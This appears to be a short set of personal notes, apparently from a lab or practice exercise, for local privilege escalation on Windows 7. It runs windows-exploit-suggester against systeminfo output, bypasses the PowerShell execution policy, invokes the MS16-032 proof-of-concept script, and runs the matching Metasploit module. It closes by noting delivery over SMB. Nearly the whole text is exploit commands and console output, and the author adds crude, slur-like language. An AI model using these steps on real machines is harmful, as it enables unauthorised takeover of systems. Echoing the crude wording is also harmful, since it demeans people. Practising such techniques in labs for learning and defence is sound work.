


```powershell
// --------------------------------- Enumerating --------------------------------- //
// using cmd, save this into an excel file 
systeminfo

//updating the local microsoft vulnerability database this shits fucking gay
sudo python2.7 windows-exploit-suggester.py --update

//running it
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt

// Exploiting MS16-032 with Powershell PoC
Set-ExecutionPolicy bypass -scope process

// Importing shit and running
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032


// Cheesing what shit with metapsloit
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 0
target => 0
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit


// just delivered it using SMB LOL

```